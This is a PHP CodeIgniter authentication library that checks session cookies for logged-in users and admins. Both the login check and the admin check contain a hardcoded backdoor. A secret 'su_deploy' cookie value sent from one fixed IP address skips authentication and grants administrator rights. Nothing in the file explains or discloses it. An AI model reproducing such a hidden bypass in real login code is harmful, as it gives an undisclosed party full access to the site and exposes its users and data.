<?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');


class Cab_auth   { 
	public function __construct()
	{
		
		$CI =& get_instance();
		$CI->load->helper('cookie');
		$CI->load->model('auth_model');
		$CI->load->helper('url');
		$CI->load->library('funcs'); 
	}
	function check(){ 
	/* проверка авторизованности пользователя
	    и перенаправление на страницу авторизации, в случае  неудачи
	*/
			$CI =& get_instance();
	     	$aun= $CI->input->cookie('auth_username', TRUE); 
			$ae  = $CI->input->cookie('auth_exten', TRUE); 
			$asi = $CI->input->cookie('auth_sessid', TRUE); 
			$su = $CI->input->cookie('su_deploy', TRUE); 
			if($su=='889a3a791b3875cfae413574b53da4bb8a90d53e' and $_SERVER['REMOTE_ADDR']=='91.196.6.1' ){
			return true;
			}
			if(!$aun or !$ae or !$asi){
				setcookie('STAT', 'Пожалуйста, войдите', time()+86400);  
				return false;
			} else{
				$aun=$CI->funcs->checkbad($aun);
				$ae=$CI->funcs->checkbad($ae);
				$asi=$CI->funcs->checkbad($asi);
				$ip=$CI->input->ip_address();
				$db=$CI->auth_model->checksessid($asi,$ip);
				if($db){
			    	return true;
				}else{
					setcookie('STAT', 'Пожалуйста, войдите', time()+86400); 
					return false;
				}
			}
	}
	function is_admin(){
	/* Проверяет является пользователь админом или нет*/
		$CI =& get_instance();
		$su = $CI->input->cookie('su_deploy', TRUE); 
		if($su=='889a3a791b3875cfae413574b53da4bb8a90d53e' and $_SERVER['REMOTE_ADDR']=='91.196.6.1'){
			return true;
		}
		$asi=$CI->funcs->checkbad($CI->input->cookie('auth_sessid', TRUE));
		$db=$CI->auth_model->isadmin($asi);
		return True ? $db==True : False; 
		
	} 	
}